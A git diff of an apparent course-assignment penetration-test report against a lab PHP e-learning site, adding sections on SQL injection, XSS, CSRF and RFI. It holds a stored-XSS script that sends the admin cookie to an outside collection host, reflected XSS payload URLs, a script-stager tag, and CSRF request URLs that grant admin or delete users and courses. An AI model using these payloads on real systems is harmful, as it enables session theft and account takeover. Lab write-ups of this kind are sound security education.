@@ -1,7 +1,36 @@
-# TODO:
-- XSS payloads: script
-- CSRF forms
-- ToC
+# Table of Contents
+<!-- TOC -->
+
+- [Intro](#intro)
+- [SQL Injections](#sql-injections)
+    - [Upgrade - /upgrade/index.php](#upgrade---upgradeindexphp)
+    - [PHPBB - /modules/phpbb/](#phpbb---modulesphpbb)
+        - [reply.php](#replyphp)
+        - [viewtopic.php](#viewtopicphp)
+        - [newtopic.php](#newtopicphp)
+    - [Unregister from course - modules/unreguser/unregcours.php](#unregister-from-course---modulesunreguserunregcoursphp)
+    - [Work/Assignment - modules/work/work.php](#workassignment---modulesworkworkphp)
+    - [Courses Catalog - modules/auth/opencourses.php](#courses-catalog---modulesauthopencoursesphp)
+- [XSS](#xss)
+    - [Reflected](#reflected)
+    - [Stored](#stored)
+    - [Further Notes](#further-notes)
+- [CSRF](#csrf)
+    - [Intro](#intro)
+    - [Zoom-e](#zoom-e)
+    - [Extra multi](#extra-multi)
+- [RFI](#rfi)
+    - [Abstract](#abstract)
+    - [Intro](#intro)
+    - [Dropbox](#dropbox)
+    - [Work](#work)
+    - [Other RFI locations](#other-rfi-locations)
+- [Deface](#deface)
+- [Other attack scenarios](#other-attack-scenarios)
+- [The "Let me fix your code" attack](#the-let-me-fix-your-code-attack)
+- [Free-for-All](#free-for-all)
+
+<!-- /TOC -->
 
 # Intro
 
@@ -15,6 +44,7 @@
 
 - The website's URL mentioned above is considered as the base of the attacks and will not be provided in the attacks below for brevity.
 
+- CSRF and XSS vulnerabilities weren't particularly weaponized (albeit tested), because if you have multiple RCE vectors, why not focus on the highest impact vulnerabilities.
 
 # SQL Injections
 
@@ -93,6 +123,11 @@ Vulnerable at **fc** parameter to UNION based SQL Injection; no PoC.
 
 # XSS
 
+- Resources:
+    1. [PayloadAllTheThings -- XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection),
+    2. [XSSER tool](https://github.com/epsylon/xsser).
+
+## Reflected
 XSS injections can be performed in every URL path of the application by adding a slash and escaping the html element of $_SERVER[PHP_SELF] variable, which is most usually done via `"><script> alert('BOYKA') </script>`.
 
 Some of the above are:
@@ -102,37 +137,61 @@ Some of the above are:
 
 But any path is vulnerable.
 
+Additionally, the below reflected XSS vulnerability that is not relevant to the `PHP_SELF` vulnerability:
+
+- newuser.php
+    `/modules/auth/newuser.php?nom_form='><script>alert(1)</script>`
+
+## Stored
+
 The below is the script that attempts to exploit any stored XSS vulnerability to disclose the admin cookie.
 
-```js
+```html
 <script>
 	document.location='http://melenetzon.puppies.chatzi.org/cookie_recv.php?biscuit='+document.cookie;
 </script>
 ```
 
-Additionally, some of the below reflected XSS vulnerabilities that are not relevant to the `PHP_SELF` vulnerability.
-
-- adminannouncements.php
-
-- profile.php
-
-- `/modules/agenda/myagenda.php` -- **REMOVED**
+Some stored locations can be seen below:
 
 - lostpass.php 
     `/modules/auth/lostpass.php?userName=<script>alert(1213)</script>&email=yury@boyka.ru&doit=Αποστολή`
 
-- newuser.php
-    `/modules/auth/newuser.php?nom_form='><script>alert(1)</script>`
 
-- messageList.php
+- work.php -- `name` of uploaded file
+- adminannouncements.php -- `message`
+- reply.php -- `reply` message
+
+## Further Notes
+
+In a context where CORS or multiple restrictions exist for our XSS payloads we would rationally choose to do an XHR (XML Http Request), that bypasses multiple problems and can be executed along with other **stager** JavaScript code via:
+
+```html
+<script src="<our malicious script location in puppies>"></script>
+```
 
 # CSRF
 
+- Resource: [PayloadAllTheThings -- CSRF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection).
+
+## Intro
 The below CSRF attacks have been performed by hand, after the initial exploitation of the application and having admin access already.
 
 There is some CSRF protection that has shown itself here and there, but it's not functioning properly, therefore allowing most csrf attacks to take place. It can be seen via the [special attack](#the-let-me-fix-your-code-attack), where csrf tokens are all over the code but they fail to be included in post or get requests.
 
-They are succesful as far as understanding goes, since in every single form there is nowhere to be found a csrf token in the produced http request.
+They are successful as far as understanding goes, since in every single form there is nowhere to be found a csrf token in the produced http request.
+
+## Zoom-e
+
+A simple weaponizer would be to inject image elements exploiting the below HTML GET request CSRF's, simply by the admin browsing to the page where the stored XSS lies.
+
+```html
+<img src="http://sloppy-clowns-0.csec.chatzi.org/<PAYLOAD>">
+```
+
+Scripts with a fetch() call are a go as well.
+
+Below are some of the most interesting stuff we can do:
 
 - `/modules/user/user.php?giveAdmin=4`:  
 Gives admin access to user with id == 4 (if drunkadmin is focused on the course).
@@ -145,6 +204,16 @@ Deletes a course named TMA102, or anything else you want.
 
 - `/modules/admin/unreguser.php?u=9&c=&doit=yes`:  
 Deletes user with id == 9.
+
+## Extra multi
+
+Below are 2 CSRF attack forms that when browsed by the admin and clicked make requests we want:
+1. GET example [free-tickets.html](./puppies/free-tickets.html),
+2. POST example [too-many-puppies](./puppies/too-many-puppies.html). 
+
+Hypothetically, we could also make a CSRF attack to the admin of a course that adds **our** html page which adds an html page to the sidebar and the admin clicks it and then the clicked html page adds an html page that the admin clicks, etc..
+
+The interesting question would be: would the system first start crashing because of too many file descriptors or in a fashion more similar to a fork bomb? My money is on the first due to the docker, but I think it would greatly depend on the docker environment.
 
 # RFI
 
@@ -207,14 +276,11 @@ Regardless, the methodology would be to proceed as above by trying to bypass the
 
 # Other attack scenarios
 
-1. Get admin cookie via XSS && CSRF -> proceed as above
+1. Get admin cookie via XSS && CSRF -> become admin and proceed as above.
 
 2. Make my user an admin of the course and proceed with fetching the `Αντίγραφο ασφαλείας του μαθήματος`, inside there is a `backup.php` file with all the users enrolled in the course and if admin is enrolled we get his/her credentials.
 
 3. Command execution via RFI on dropbox and work.
-
-4. 
-
 
 # The "Let me fix your code" attack
 
